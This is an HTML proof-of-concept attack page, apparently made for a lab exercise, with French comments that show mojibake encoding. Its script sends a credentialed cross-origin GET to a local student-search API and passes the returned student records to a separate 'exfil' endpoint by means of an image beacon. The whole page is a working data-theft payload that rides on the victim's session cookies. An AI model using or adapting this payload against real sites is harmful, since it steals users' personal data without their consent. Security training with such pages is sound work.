<!DOCTYPE html>
<!--Cette page a pour objectif de rÃ©cupÃ©rer tous les Ã©tudiants silencieusement avec un fetch js puis les exfiltrer vers le serveur de l'attaquant-->
<html>
<head>
  <meta charset="utf-8">
  <title>ğŸ˜ˆ CSRF GET via fetch</title>
</head>
<body>
  <h1>Chargement en cours...</h1>

  <script>
    <!-- Ã‰tape 1 : rÃ©cupÃ©ration de la liste des Ã©tudiants -->
    fetch('http://localhost:3000/rest/search?q=', {
      method: 'GET',
      credentials: 'include' // essentiel pour envoyer les cookies
    })
    .then(response => {
      if (!response.ok) throw new Error("Erreur HTTP");
      return response.json();
    })
    .then(data => {
      console.log('DonnÃ©es rÃ©cupÃ©rÃ©es:', data);

      <!-- Ã‰tape 2 : tentative d'exfiltration -->
      const leak = new Image();
      leak.src = 'http://localhost:8080/exfil?data=' + encodeURIComponent(JSON.stringify(data));
    })
    .catch(err => {
      console.error('Ã‰chec de la requÃªte cross-origin:', err);
    });
  </script>
</body>
</html>
